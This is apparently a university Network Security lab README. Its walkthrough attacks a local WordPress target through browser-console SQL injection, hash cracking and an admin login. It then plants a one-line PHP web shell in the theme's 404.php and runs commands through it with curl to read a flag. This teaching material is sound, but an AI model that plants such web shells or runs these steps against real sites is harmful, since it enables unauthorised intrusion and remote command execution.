# Progetto Network Security 2023

Progetto per l'esame di Network Security di Dotani, Ferrara, Forino, Galateo

## Usage

1. Connect to the Kali shell using the dsp.
2. Enable VNC by running the script at `/home/vnc.sh`.
3. Connect to the GUI using a VNC viewer.
4. Use Kali's browser to browse to the target at IP address `193.20.1.4`.
5. Use the unknown mode.
6. Answer "Yes" to the poll.
7. Open the script at `/home/sql_inj_script.js` with a text editor.
8. Copy/paste the first part of the script into the browser's console.
9. After the page reloads, you will see an error in the console.
10. Copy/paste the second part of the script into the console, and you will get the users list in the console.
11. Repeat with the 3rd and 4th parts of the script to get the hashes list in the browser's console.
12. Copy the hash from the console and paste it into the `hash.txt` file in the `/home` directory.
13. Open the terminal and run the following commands:
    ```
    cd /home
    ./discover_psw.sh
    ```
14. You will find the matched `hash:pwd` in the `cracked.txt` file.
15. Log in to the following URL: `http://193.20.1.4/wp-login.php`.
16. Open the theme editor and edit the page `404.php` of the `twentytwenty` theme.
17. Overwrite all the code with the following:
    ```
    <?php 
    system($_GET['cmd']);
    ```
18. Call the following URL for remote code execution (you can run any shell command by passing it after the `cmd` parameter in the URL):
    ```
    curl -X GET "http://193.20.1.4/wp-content/themes/<themename>/404.php?cmd=cat%20flag.txt"
    ```

## Installation

1. Install Docker
2. Clone the repository.
3. Run the following 
```
docker compose up
```

## License

This project is licensed under the MIT License - see the LICENSE file for details.
